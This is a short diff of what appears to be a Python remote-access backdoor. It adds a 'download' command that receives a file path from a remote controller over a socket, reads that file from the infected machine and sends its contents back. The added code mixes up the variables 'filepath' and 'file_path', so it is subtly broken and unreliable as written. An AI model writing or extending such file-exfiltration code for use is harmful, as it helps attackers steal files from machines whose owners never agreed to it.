@@ -38,6 +38,15 @@ while 1:
         print("")
         print("Command has been 3XECUT3D succesfully")
 
+    elif command == "download":
+        filepath = s.recv(5000)
+        filepath = file_path.decode()
+        file = open(file_path, "rb")
+        data = file.read()
+        s.send(data)
+        print("")
+        print("File has been sent succesFully")
+
 
     else:
         print("")
